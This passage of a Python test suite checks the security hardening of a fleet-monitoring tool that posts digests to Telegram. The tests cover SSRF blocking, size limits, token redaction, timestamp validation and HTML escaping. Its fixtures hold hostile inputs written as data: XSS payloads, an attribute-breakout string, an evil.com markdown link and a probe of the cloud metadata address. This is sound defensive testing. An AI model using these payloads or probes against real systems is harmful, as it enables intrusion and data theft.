    assert _safe_pct(50, float("inf")) == 0.0
    # Type coercion resilience
    assert _safe_pct(None, 100) == 0.0
    assert _safe_pct("25", "100") == 25.0
    assert _safe_pct("invalid", "invalid") == 0.0


def test_safe_fetch_json_enforces_url_validation():
    """CWE-918: _safe_fetch_json must reject file://, gopher://, and cloud metadata schemes."""
    with pytest.raises(ValueError, match="Invalid scheme"):
        _safe_fetch_json("file:///home/zen/.env")

    with pytest.raises(ValueError, match="blocked address class"):
        _safe_fetch_json("http://169.254.169.254/latest/meta-data/")


def test_safe_fetch_json_rejects_oversized_payload(monkeypatch):
    """CWE-400: _safe_fetch_json must reject payloads exceeding max_bytes ceiling to prevent memory DoS."""
    class MockOversizedResponse:
        def __init__(self, size: int):
            self.size = size

        def read(self, n=-1):
            read_len = n if n > 0 else self.size
            return b"{" + b" " * read_len

        def __enter__(self):
            return self

        def __exit__(self, *args):
            pass

    monkeypatch.setattr(
        "urllib.request.urlopen",
        lambda *args, **kwargs: MockOversizedResponse(MAX_FLEET_BYTES + 1024),
    )

    with pytest.raises(ValueError, match="exceeds size ceiling"):
        _safe_fetch_json("http://mock-fleet:8080/nodes", max_bytes=MAX_FLEET_BYTES)


def test_canary_poison_fleet_endpoint_fails_safe(tmp_path):
    """Adversarial Canary Test: Poisoned fleet endpoint returning an oversize body fails closed."""
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary:8080",
        fleet_council_url="http://mock-council:8080",
        fleet_nodes_url="http://mock-nodes:8080",
        fleet_jobs_url="http://mock-jobs:8080",
    )

    class MockPoisonResponse:
        def read(self, n=-1):
            return b"A" * (MAX_FLEET_BYTES + 2048)

        def __enter__(self):
            return self

        def __exit__(self, *args):
            pass

    with patch("urllib.request.urlopen", return_value=MockPoisonResponse()):
        res = detector.check_stream_5_fleet_mesh()
        assert res["status"] == "CRITICAL"
        assert res["score"] == 0
        assert "exceeds size ceiling" in res.get("error", "")


def test_safe_format_prompt_xss_and_injection_resilience():
    """CWE-116: Verify prompt formatting thoroughly neutralizes HTML and injection payloads."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)

    # 1. XSS payloads
    payload = "<script>alert('pwn')</script>"
    formatted = notifier._safe_format_prompt(payload, limit=100)
    assert "<script>" not in formatted
    assert "&lt;script&gt;" in formatted

    # 2. Markdown / URL injection attempts
    md_payload = "*pwn*](http://evil.com/leak)"
    formatted_md = notifier._safe_format_prompt(md_payload, limit=100)
    assert "<" not in formatted_md and ">" not in formatted_md

    # 3. Newline stripping and multi-space collapsing
    multiline = "line1\n\n\rline2   with   spaces"
    assert notifier._safe_format_prompt(multiline) == "line1 line2 with spaces"


# ==============================================================================
# Nebula Cycle 35 Adversarial Security Suite (CWE-116, CWE-532, CWE-918, CWE-400)
# ==============================================================================

def test_starved_pro_nodes_and_node_names_html_escaped():
    """CWE-116: Verify starved_pro_nodes with XSS/HTML payloads are escaped clean in digest output."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    scan_result = {
        "overall_health_score": 90,
        "overall_severity": "OPTIMAL",
        "cron_anomalies": {"clogged": [], "drift_skipped": [], "auth_failed": [], "overdue": []},
        "entropy_streams": {
            "overall_status": "OPTIMAL",
            "streams": [
                {
                    "name": "AGY Fleet & Clef Mesh",
                    "status": "PASS",
                    "pro_first_criterion": {
                        "badge": "🟡 CẦN TỐI ƯU",
                        "grade": "ACCEPTABLE",
                        "pro_burn_pct": 45.0,
                        "pro_consumed_tokens": 1000000,
                        "pro_capacity_tokens": 2000000,
                        "pro_request_share_pct": 50.0,
                        "recent_pro_share_pct": 45.0,
                        "pro_requests": 50,
                        "total_requests": 100,
                        "starved_count": 2,
                        "total_pro_nodes": 5,
                        "starved_pro_nodes": ["<script>alert(1)</script>", "<b>evil_node</b>"],
                        "verdict": "Node needs <img src=x onerror=alert(1)>",
                    },
                    "total_jobs_tokens": 5000,
                    "total_fleet_tokens": 10000,
                    "top_3_tasks": [],
                    "top_5_nodes": [],
                }
            ],
        },
        "self_healing": {"actions": []},
    }

    digest = notifier.format_hourly_digest(scan_result)
    assert "<script>" not in digest
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in digest
    assert "<b>evil_node</b>" not in digest
    assert "&lt;b&gt;evil_node&lt;/b&gt;" in digest
    assert "<img" not in digest
    assert "&lt;img" in digest


def test_telegram_message_truncation_under_4096_and_valid_tags(tmp_path):
    """CWE-116: Verify length bomb is truncated to <= 4096 chars with balanced HTML tags."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)

    # 1. Direct truncate_telegram_html check
    bomb = "<b>Header: <i>Nested <code>" + "A" * 8000 + "</code></i></b>"
    truncated = notifier.truncate_telegram_html(bomb, max_chars=4096)
    assert len(truncated) <= 4096
    assert truncated.endswith("</code></i></b>")
    assert "Cắt bớt do giới hạn Telegram" in truncated

    # 2. send_payload_result integration check
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345\n")
    live_notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID, ledger_path=tmp_path / "ledger.json")

    captured_payloads = []
    class MockSuccessResponse:
        def read(self, *args):
            return b'{"ok": true}'
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass

    def mock_urlopen(req, *args, **kwargs):
        payload_data = json.loads(req.data.decode("utf-8"))
        captured_payloads.append(payload_data)
        return MockSuccessResponse()

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = live_notifier.send_payload_result(bomb)
        assert res == SendResult.DELIVERED
        assert len(captured_payloads) == 1
        sent_text = captured_payloads[0]["text"]
        assert len(sent_text) <= 4096
        assert sent_text.endswith("</code></i></b>")


def test_bot_token_in_url_redacted():
    """CWE-532: Verify bot tokens in Telegram URLs are masked to [REDACTED]."""
    url_err = "urllib.error.URLError: <urlopen error https://api.telegram.org/bot123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345/sendMessage connection refused>"
    redacted = HermesTelegramNotifier.redact_secrets(url_err)
    assert "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345" not in redacted
    assert "https://api.telegram.org/bot[REDACTED]/sendMessage" in redacted


def test_zero_capacity_pro_node_no_zero_division():
    """Zero-Division Guard: Nodes with quota_weekly_capacity == 0 do not raise ZeroDivisionError."""
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary:8080",
        fleet_council_url="http://mock-council:8080",
        fleet_nodes_url="http://mock-nodes:8080",
        fleet_jobs_url="http://mock-jobs:8080",
    )

    mock_summary = {"status": "ok", "active_nodes": 2, "jobs_pending": 0, "jobs_running": 0}
    mock_council = {"last_resolution": "approved"}
    mock_nodes = [
        {"name": "pro-zero-cap", "tier": "Pro", "quota_weekly_capacity": 0, "quota_weekly_consumed": 0, "requests_served": 0},
        {"name": "pro-zero-cap-2", "tier": "Pro", "quota_weekly_capacity": 0, "quota_weekly_consumed": 100, "requests_served": 5},
    ]
    mock_jobs = []

    def mock_fetch(url, *args, **kwargs):
        if "summary" in url:
            return mock_summary
        if "council" in url:
            return mock_council
        if "nodes" in url:
            return mock_nodes
        if "jobs" in url:
            return mock_jobs
        return {}

    with patch("tools.hourly_digest_monitor._safe_fetch_json", side_effect=mock_fetch):
        res = detector.check_stream_5_fleet_mesh()
        assert res["status"] in ("HEALTHY", "DEGRADED", "CRITICAL")
        pro_crit = res.get("pro_first_criterion", {})
        assert pro_crit.get("grade") in ("OPTIMAL", "ACCEPTABLE", "DEFICIT")
        assert pro_crit.get("pro_burn_pct") == 0.0
        assert pro_crit.get("pro_capacity_tokens") == 0


def test_non_standard_telemetry_resilience():
    """Type Coercion Guard: String NaNs, Infs, and non-standard telemetry are gracefully handled."""
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary:8080",
        fleet_council_url="http://mock-council:8080",
        fleet_nodes_url="http://mock-nodes:8080",
        fleet_jobs_url="http://mock-jobs:8080",
    )

    mock_nodes = [
        {
            "name": "node-nan",
            "tier": "Pro",
            "quota_weekly_percent": "N/A",
            "quota_weekly_capacity": None,
            "quota_weekly_consumed": "invalid",
            "requests_served": "NaN",
            "active_jobs": "-10",
        }
    ]
    mock_jobs = [
        {
            "job_id": "job-inf",
            "node_name": "node-nan",
            "model": "gemini-3.8-flash-high",
            "total_tokens": "Inf",
            "prompt": "Test prompt with non-numeric tokens",
        }
    ]

    def mock_fetch(url, *args, **kwargs):
        if "summary" in url:
            return {"status": "ok", "active_nodes": 1, "jobs_pending": 0, "jobs_running": 0}
        if "council" in url:
            return {"last_resolution": "approved"}
        if "nodes" in url:
            return mock_nodes
        if "jobs" in url:
            return mock_jobs
        return {}

    with patch("tools.hourly_digest_monitor._safe_fetch_json", side_effect=mock_fetch):
        res = detector.check_stream_5_fleet_mesh()
        assert res["status"] in ("HEALTHY", "DEGRADED", "CRITICAL")
        assert res["total_jobs_tokens"] == 0
        assert res["total_fleet_tokens"] == 0


def test_ssrf_probe_aws_metadata_rejected():
    """CWE-918: Cloud link-local metadata IP 169.254.169.254 is rejected unconditionally."""
    with pytest.raises(ValueError, match="blocked address class"):
        _validate_fleet_url("http://169.254.169.254/latest/meta-data/")


def test_safe_fetch_json_rejects_payload_over_8mb(monkeypatch):
    """CWE-400: Payload exceeding 8MiB max_bytes ceiling is strictly rejected."""
    class MockOversized:
        def read(self, n=-1):
            return b"{" + b"A" * (MAX_FLEET_BYTES + 100)
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass

    monkeypatch.setattr("urllib.request.urlopen", lambda *args, **kwargs: MockOversized())

    with pytest.raises(ValueError, match="exceeds size ceiling of 8388608 bytes"):
        _safe_fetch_json("http://mock-fleet:8080/jobs")


def test_truncate_closing_tag_bomb_stays_under_limit():
    """CWE-400/116: payload whose CLOSING sequence alone is large must still fit 4096."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    # 300 nested 1-char tags => closing sequence ~ 300*4 chars, plus notice
    opens = "".join("<b>" for _ in range(300))
    closes = "".join("</b>" for _ in range(300))
    bomb = opens + ("A" * 8000) + closes
    out = notifier.truncate_telegram_html(bomb, max_chars=4096)
    assert len(out) <= 4096
    assert out.count("<b>") == out.count("</b>")  # tags balanced after truncation


def test_truncate_never_splits_html_entity():
    """CWE-116: truncation boundary must not fall inside an &entity; token."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    # pack '&lt;' entities right up to the boundary
    payload = "&lt;" * 2000
    out = notifier.truncate_telegram_html(payload, max_chars=4096)
    assert len(out) <= 4096
    # no dangling partial entity at the cut
    assert not out.rstrip("…").endswith(("&", "&l", "&lt", "&amp", "&g", "&gt"))


def test_all_untrusted_render_paths_escaped():
    """CWE-116: XSS payloads in top_5_nodes / self_healing.actions must also be escaped."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    scan = {
        "overall_health_score": 100,
        "severity": "HEALTHY",
        "cron": {"cron_health_score": 100, "ticker_heartbeat": {"is_stale": False, "age_seconds": 10}},
        "entropy": {
            "entropy_health_score": 100,
            "streams": [
                {
                    "name": "Fleet Mesh",
                    "status": "HEALTHY",
                    "top_5_nodes": [
                        {"name": "<script>x</script>", "tier": "<b onmouseover=evil()>", "tokens": 1}
                    ],
                }
            ],
        },
        "self_healing": {"actions": ["<img src=x onerror=alert(1)>"]},
    }
    digest = notifier.format_hourly_digest(scan)
    assert "<script>" not in digest and "<img" not in digest and "<b onmouseover" not in digest
    assert "&lt;script&gt;" in digest and "&lt;img" in digest


def test_bare_bot_token_in_exception_is_redacted():
    """CWE-532: token leaked outside a URL (e.g. exception text) must still be scrubbed."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    leak = "connection failed with token 123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345 retrying"
    scrubbed = notifier._scrub_secrets(leak)
    assert "123456789:ABCdefGhIjkLmNoPqRsTuVwXyZ_12345" not in scrubbed
    assert "[REDACTED]" in scrubbed


def test_longer_ellipsis_still_respects_ceiling():
    """Guards the 'junior localizes the marker' and small-budget regression."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    for limit in [30, 40, 50, 64, 100, 250, 500, 4096]:
        out = notifier.truncate_telegram_html("<b>" + "A" * 8000 + "</b>", max_chars=limit)
        assert len(out) <= limit, f"Failed at limit={limit}: got {len(out)}"


def test_truncate_never_splits_entity_property_sweep():
    """Property test: sweeps various entity types and cuts to ensure zero entity splitting."""
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    entities = ["&lt;", "&gt;", "&amp;", "&quot;", "&#65;", "&#x41;"]
    for ent in entities:
        payload = f"<b>Leading text {ent * 1000} trailing text</b>"
        for limit in [50, 80, 100, 200, 500, 1000]:
            out = notifier.truncate_telegram_html(payload, max_chars=limit)
            assert len(out) <= limit
            assert not re.search(r"&[a-zA-Z#0-9]*$", out), f"Dangling entity detected at limit {limit}: {out[-20:]}"


def test_top_5_nodes_in_past_1_hour_instead_of_all_time(tmp_path):
    """Verifies that top_5_nodes ranks nodes strictly based on activity in the past 1 hour, not all-time."""
    now = time.time()
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    summary_resp = json.dumps({"online_nodes": 20, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 90.0, "sla_passed": True}).encode("utf-8")

    nodes_data = {
        "nodes": [
            {"name": "ultra-exhausted", "tier": "ultra", "requests_served": 1000, "quota_weekly_consumed": 2500000, "active_jobs": 0},
            {"name": "pro-dormant", "tier": "pro", "requests_served": 800, "quota_weekly_consumed": 2000000, "active_jobs": 0},
            {"name": "node-active-1", "tier": "pro", "requests_served": 25, "quota_weekly_consumed": 50000, "active_jobs": 1},
            {"name": "node-active-2", "tier": "pro", "requests_served": 20, "quota_weekly_consumed": 40000, "active_jobs": 0},
            {"name": "node-active-3", "tier": "pro", "requests_served": 15, "quota_weekly_consumed": 30000, "active_jobs": 0},
            {"name": "node-active-4", "tier": "pro", "requests_served": 10, "quota_weekly_consumed": 20000, "active_jobs": 0},
            {"name": "node-active-5", "tier": "pro", "requests_served": 5, "quota_weekly_consumed": 10000, "active_jobs": 0},
        ]
    }
    nodes_resp = json.dumps(nodes_data).encode("utf-8")

    jobs_list = []
    # Old jobs for ultra-exhausted (outside 1h)
    for i in range(10):
        jobs_list.append({
            "job_id": f"old-{i}",
            "node_name": "ultra-exhausted",
            "model": "claude-opus-4.8",
            "total_tokens": 5000,
            "created_at": now - 7200,
            "completed_at": now - 7190,
        })
    # 1 recent job for pro-dormant
    jobs_list.append({
        "job_id": "recent-dormant",
        "node_name": "pro-dormant",
        "model": "gemini-3.8-flash-high",
        "total_tokens": 1000,
        "created_at": now - 600,
        "completed_at": now - 590,
    })
    # Recent jobs for node-active-1 (10 jobs)
    for i in range(10):
        jobs_list.append({
            "job_id": f"act1-{i}",
            "node_name": "node-active-1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 2000,
            "created_at": now - (100 * (i + 1)),
            "completed_at": now - (100 * (i + 1) - 5),
        })
    # Recent jobs for node-active-2 (8 jobs)
    for i in range(8):
        jobs_list.append({
            "job_id": f"act2-{i}",
            "node_name": "node-active-2",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 1500,
            "created_at": now - (120 * (i + 1)),
            "completed_at": now - (120 * (i + 1) - 5),
        })
    # Recent jobs for node-active-3 (6 jobs)
    for i in range(6):
        jobs_list.append({
            "job_id": f"act3-{i}",
            "node_name": "node-active-3",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 1200,
            "created_at": now - (150 * (i + 1)),
            "completed_at": now - (150 * (i + 1) - 5),
        })
    # Recent jobs for node-active-4 (4 jobs)
    for i in range(4):
        jobs_list.append({
            "job_id": f"act4-{i}",
            "node_name": "node-active-4",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 1000,
            "created_at": now - (200 * (i + 1)),
            "completed_at": now - (200 * (i + 1) - 5),
        })
    # Recent jobs for node-active-5 (2 jobs)
    for i in range(2):
        jobs_list.append({
            "job_id": f"act5-{i}",
            "node_name": "node-active-5",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 800,
            "created_at": now - (300 * (i + 1)),
            "completed_at": now - (300 * (i + 1) - 5),
        })

    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now)

    top_nodes = res["top_5_nodes"]
    assert len(top_nodes) == 5
    top_names = [n["name"] for n in top_nodes]
    assert top_names == ["node-active-1", "node-active-2", "node-active-3", "node-active-4", "node-active-5"]
    assert "ultra-exhausted" not in top_names
    assert "pro-dormant" not in top_names
    assert top_nodes[0]["requests_served_1h"] == 10
    assert top_nodes[0]["tokens_consumed_1h"] == 20000
    assert top_nodes[0]["requests_served_all_time"] == 25

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    scan_result = {
        "overall_health_score": 95,
        "severity": "HEALTHY",
        "cron": {"cron_health_score": 100, "ticker_heartbeat": {"is_stale": False, "age_seconds": 10}},
        "entropy": {"entropy_health_score": 95, "streams": [res]},
    }
    digest = notifier.format_hourly_digest(scan_result)
    assert "Top 5 Nodes làm việc nhiều nhất (1 giờ qua)" in digest
    assert "<code>10</code> reqs (1h)" in digest
    assert "node-active-1" in digest
    assert "ultra-exhausted" not in digest


def test_ranking_ignores_future_and_malformed_timestamps():
    """Adversarial Clock Drift & Injection Gate:
    1. Jobs with timestamps > now + 60s (future clock drift/forgery) must be rejected.
    2. Jobs with missing timestamps (when valid timestamps exist) must be rejected.
    3. Jobs with non-numeric/unparseable timestamps must be rejected.
    4. Jobs with boolean timestamps (e.g. True) must be rejected (isinstance bool check).
    5. Jobs at exact 1-hour boundary (now - 3600.0) must be accepted.
    6. n2 (active in 1h) must strictly outrank n1 (adversarial/future/stale jobs) despite n1 having higher all-time requests.
    7. window_anomalies correctly tallies future_rejected, malformed_rejected, and stale_filtered.
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0

    summary_resp = json.dumps({"online_nodes": 18, "total_nodes": 18}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 98.0, "sla_passed": True}).encode("utf-8")

    nodes_data = {
        "nodes": [
            {"name": "adversarial-n1", "tier": "pro", "requests_served": 50, "quota_weekly_consumed": 50000, "active_jobs": 0},
            {"name": "valid-n2", "tier": "pro", "requests_served": 2, "quota_weekly_consumed": 2000, "active_jobs": 0},
        ]
    }
    nodes_resp = json.dumps(nodes_data).encode("utf-8")

    jobs_list = [
        # Adversarial job 1: Future timestamp (now + 3600s) -> rejected (future_rejected)
        {
            "job_id": "future-job",
            "node_name": "adversarial-n1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 999999,
            "created_at": now + 3600.0,
            "completed_at": now + 3605.0,
        },
        # Adversarial job 2: Missing timestamp -> rejected (malformed_rejected)
        {
            "job_id": "missing-ts-job",
            "node_name": "adversarial-n1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 888888,
        },
        # Adversarial job 3: Non-numeric unparseable string -> rejected (malformed_rejected)
        {
            "job_id": "malformed-str-job",
            "node_name": "adversarial-n1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 777777,
            "created_at": "not-a-number",
            "completed_at": "invalid-timestamp",
        },
        # Adversarial job 4: Boolean timestamp (True) -> rejected (malformed_rejected)
        {
            "job_id": "bool-ts-job",
            "node_name": "adversarial-n1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 666666,
            "created_at": True,
            "completed_at": True,
        },
        # Stale job: Outside 1-hour window (now - 7200s) -> filtered (stale_filtered)
        {
            "job_id": "stale-job",
            "node_name": "adversarial-n1",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 555555,
            "created_at": now - 7200.0,
            "completed_at": now - 7195.0,
        },
        # Valid job 1 for n2: Exactly at boundary (now - 3600.0s) -> accepted
        {
            "job_id": "boundary-job",
            "node_name": "valid-n2",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 1500,
            "created_at": now - 3600.0,
            "completed_at": now - 3595.0,
        },
        # Valid job 2 for n2: Inside 1-hour window (now - 300.0s) -> accepted
        {
            "job_id": "valid-recent-job",
            "node_name": "valid-n2",
            "model": "gemini-3.8-flash-high",
            "total_tokens": 2500,
            "created_at": now - 300.0,
            "completed_at": now - 295.0,
        },
    ]
    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now)

    # Verify window anomalies tally
    anomalies = res.get("window_anomalies", {})
    assert anomalies.get("future_rejected") == 1
    assert anomalies.get("malformed_rejected") == 3
    assert anomalies.get("stale_filtered") == 1

    # Verify 1-hour token sum only contains valid jobs for n2 (1500 + 2500 = 4000)
    assert res["total_jobs_tokens_1h"] == 4000

    # Verify ranking: valid-n2 outranks adversarial-n1
    top_nodes = res["top_5_nodes"]
    assert len(top_nodes) == 2
    assert top_nodes[0]["name"] == "valid-n2"
    assert top_nodes[0]["requests_served_1h"] == 2
    assert top_nodes[0]["tokens_consumed_1h"] == 4000

    assert top_nodes[1]["name"] == "adversarial-n1"
    assert top_nodes[1]["requests_served_1h"] == 0
    assert top_nodes[1]["tokens_consumed_1h"] == 0
    assert top_nodes[1]["requests_served_all_time"] == 50


def test_job_timestamp_boundary_and_clock_skew_resilience():
    """Nebula Cycle 36 Adversarial Clock Skew & Timestamp Boundary Test:
    - Exact boundary: now - 3600.0s (included in 1h window).
    - Inside 1h window: now - 3599.0s (included).
    - Outside 1h window: now - 3601.0s (excluded -> stale_filtered).
    - Future within slack (now + 30.0s, slack is 60.0s) (included).
    - Future beyond slack (now + 60.1s, now + 7200.0s) (excluded -> future_rejected).
    - Non-finite / corrupt timestamps: float("nan"), float("inf"), 1e30, -100.0, "invalid".
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0

    summary_resp = json.dumps({"online_nodes": 10, "total_nodes": 10}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 95.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({"nodes": [{"name": "n1", "tier": "pro", "requests_served": 1, "quota_weekly_consumed": 1000, "active_jobs": 0}]}).encode("utf-8")

    jobs_list = [
        # 1. Exact boundary: now - 3600.0 -> accepted
        {"job_id": "exact-boundary", "node_name": "n1", "model": "m", "total_tokens": 100, "created_at": now - 3600.0},
        # 2. Inside window: now - 3599.0 -> accepted
        {"job_id": "inside-window", "node_name": "n1", "model": "m", "total_tokens": 200, "created_at": now - 3599.0},
        # 3. Outside window: now - 3601.0 -> stale_filtered
        {"job_id": "outside-window", "node_name": "n1", "model": "m", "total_tokens": 400, "created_at": now - 3601.0},
        # 4. Future within slack: now + 30.0 -> accepted
        {"job_id": "future-slack-ok", "node_name": "n1", "model": "m", "total_tokens": 800, "created_at": now + 30.0},
        # 5. Future beyond slack: now + 60.1 -> future_rejected
        {"job_id": "future-slack-exceeded", "node_name": "n1", "model": "m", "total_tokens": 1600, "created_at": now + 60.1},
        # 6. Future astronomical: now + 7200.0 -> future_rejected
        {"job_id": "future-astronomical", "node_name": "n1", "model": "m", "total_tokens": 3200, "created_at": now + 7200.0},
        # 7. NaN timestamp -> malformed_rejected
        {"job_id": "nan-ts", "node_name": "n1", "model": "m", "total_tokens": 6400, "created_at": float("nan")},
        # 8. Inf timestamp -> malformed_rejected
        {"job_id": "inf-ts", "node_name": "n1", "model": "m", "total_tokens": 12800, "created_at": float("inf")},
        # 9. Overflow timestamp (1e30) -> malformed_rejected
        {"job_id": "overflow-ts", "node_name": "n1", "model": "m", "total_tokens": 25600, "created_at": 1e30},
        # 10. String invalid -> malformed_rejected
        {"job_id": "str-invalid", "node_name": "n1", "model": "m", "total_tokens": 51200, "created_at": "invalid_date_not_iso"},
        # 11. Stale pre-epoch / ancient: -100.0 -> stale_filtered (dt in 1969 < cutoff_ts)
        {"job_id": "ancient-ts", "node_name": "n1", "model": "m", "total_tokens": 102400, "created_at": -100.0},
    ]
    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now)

    anomalies = res.get("window_anomalies", {})
    assert anomalies["future_rejected"] == 2  # jobs 5, 6
    assert anomalies["malformed_rejected"] == 4  # jobs 7, 8, 9, 10
    assert anomalies["stale_filtered"] == 2  # jobs 3, 11

    # Only jobs 1, 2, 4 are accepted: 100 + 200 + 800 = 1100 tokens
    assert res["total_jobs_tokens_1h"] == 1100
    top_nodes = res["top_5_nodes"]
    assert top_nodes[0]["requests_served_1h"] == 3
    assert top_nodes[0]["tokens_consumed_1h"] == 1100


def test_untrusted_stored_injection_in_fleet_jobs_and_nodes_escaped(tmp_path):
    """Nebula Cycle 36 Stored-Injection & Telegram HTML Sanitization Fuzzing:
    Verify that adversarial inputs across node names, tiers, job IDs, models,
    prompts, and starved node lists are safely escaped with quote=True and cannot
    break out of Telegram HTML formatting or execute arbitrary tags.
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0

    summary_resp = json.dumps({"online_nodes": 5, "total_nodes": 5}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 90.0, "sla_passed": True}).encode("utf-8")

    nodes_resp = json.dumps({
        "nodes": [
            {
                "name": "<script>alert('node')</script>&",
                "tier": "pro\" autofocus onfocus=\"alert(1)",
                "requests_served": 5,
                "quota_weekly_consumed": 50000,
                "quota_weekly_percent": 80.0,
                "active_jobs": 1,
            },
            {
                "name": "pro-starved-<b>1</b>",
                "tier": "pro",
                "requests_served": 0,
                "quota_weekly_consumed": 0,
                "quota_weekly_percent": 100.0,
                "active_jobs": 0,
            },
        ]
    }).encode("utf-8")

    jobs_resp = json.dumps({
        "jobs": [
            {
                "job_id": "<script>evil</script>\"'",
                "node_name": "<script>alert('node')</script>&",
                "model": "model<b onclick=\"bad()\">\"'",
                "total_tokens": 10000,
                "prompt": "<svg/onload=alert('prompt')>&quot;Hello<script>alert(2)</script>",
                "completed_at": now - 60.0,
            }
        ]
    }).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        stream_res = detector.check_stream_5_fleet_mesh(now_ts=now)

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    scan_result = {
        "overall_health_score": 92,
        "severity": "HEALTHY",
        "cron": {"cron_health_score": 100, "ticker_heartbeat": {"is_stale": False, "age_seconds": 15}},
        "entropy": {"entropy_health_score": 90, "streams": [stream_res]},
    }
